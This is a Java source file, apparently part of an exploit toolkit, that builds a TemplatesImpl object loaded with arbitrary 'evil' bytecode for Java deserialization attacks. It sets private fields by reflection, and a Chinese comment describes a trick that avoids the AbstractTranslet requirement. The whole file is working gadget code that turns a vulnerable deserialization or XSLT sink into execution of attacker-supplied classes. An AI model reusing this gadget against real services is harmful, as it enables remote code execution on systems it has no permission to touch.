package tools;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;

import javax.xml.transform.Templates;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

public class TemplatesGen {
    public static Templates getTemplates(byte[] byteCode, String bytePath) throws IOException, IllegalAccessException, CannotCompileException {
        byte[] evilBytes;
        if (byteCode != null) {
            evilBytes = byteCode;
        }else {
            evilBytes = Files.readAllBytes(Paths.get(bytePath));
        }
        TemplatesImpl templates = new TemplatesImpl();
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("useless");
        byte[] useless = ctClass.toBytecode();
        ReflectTools.setFieldValue(templates, "_name", "1diot9");
        ReflectTools.setFieldValue(templates, "_class", null);
//        ReflectTools.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        ReflectTools.setFieldValue(templates, "_transletIndex", 0);
        // 修改bytecodes数量和transletIndex，这样就不用继承AbstractTranslet
        ReflectTools.setFieldValue(templates, "_bytecodes", new byte[][]{evilBytes, useless});
        return templates;
    }

}
